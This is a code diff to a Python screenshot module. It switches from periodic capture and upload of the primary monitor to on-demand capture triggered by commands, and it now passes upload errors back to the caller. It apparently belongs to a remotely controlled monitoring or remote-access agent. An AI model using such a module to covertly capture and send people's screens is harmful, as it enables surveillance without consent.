@@ -17,24 +17,20 @@ class ScreenshotCapture:
         self.thread = None
 
     def start(self):
-        if self.running: return
-        self.running = True
-        self.thread = threading.Thread(target=self._loop, daemon=True)
-        self.thread.start()
-        print("[Screens] Module Started")
+        # No loop anymore, waiting for commands
+        print("[Screens] Module Ready (On-Demand)")
 
     def stop(self):
-        self.running = False
+        pass
 
-    def _loop(self):
+    def capture_now(self):
         with mss.mss() as sct:
-            while self.running:
-                try:
-                    self._capture_and_send(sct)
-                except Exception as e:
-                    print(f"[Screens] Error: {e}")
-                
-                time.sleep(self.interval)
+            try:
+                self._capture_and_send(sct)
+                return True, "Screenshot Sent"
+            except Exception as e:
+                print(f"[Screens] Error: {e}")
+                return False, str(e)
 
     def _capture_and_send(self, sct):
         # Capture Monitor 1
@@ -64,5 +60,7 @@ class ScreenshotCapture:
                 print(f"[Screens] Sent Screenshot")
             else:
                 print(f"[Screens] Upload Failed: {resp.status_code}")
+                raise Exception(f"Upload Failed: {resp.status_code}")
         except Exception as e:
             print(f"[Screens] Network Error: {e}")
+            raise
